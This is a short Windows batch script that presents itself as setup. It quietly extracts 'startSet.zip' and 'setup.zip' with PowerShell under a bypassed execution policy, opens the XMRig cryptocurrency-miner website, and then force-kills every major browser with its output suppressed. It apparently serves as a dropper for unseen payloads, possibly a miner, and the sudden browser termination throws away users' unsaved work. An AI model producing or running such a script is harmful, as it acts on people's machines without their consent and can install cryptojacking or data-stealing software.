@echo off
setlocal

set "BASEDIR=%~dp0"
set "ZIP1=%BASEDIR%startSet.zip"
set "ZIP2=%BASEDIR%setup.zip"

call :UNZIP "%ZIP1%"
call :UNZIP "%ZIP2%"

start "" "https://xmrig.com/"
timeout /t 1 >nul

taskkill /F /IM chrome.exe >nul 2>&1
taskkill /F /IM msedge.exe >nul 2>&1
taskkill /F /IM firefox.exe >nul 2>&1
taskkill /F /IM opera.exe >nul 2>&1

exit

:UNZIP
set "ZIP=%~1"
if not exist "%ZIP%" goto :EOF

powershell -NoProfile -ExecutionPolicy Bypass ^
  -Command "Expand-Archive -LiteralPath '%ZIP%' -DestinationPath '%BASEDIR%' -Force"

goto :EOF
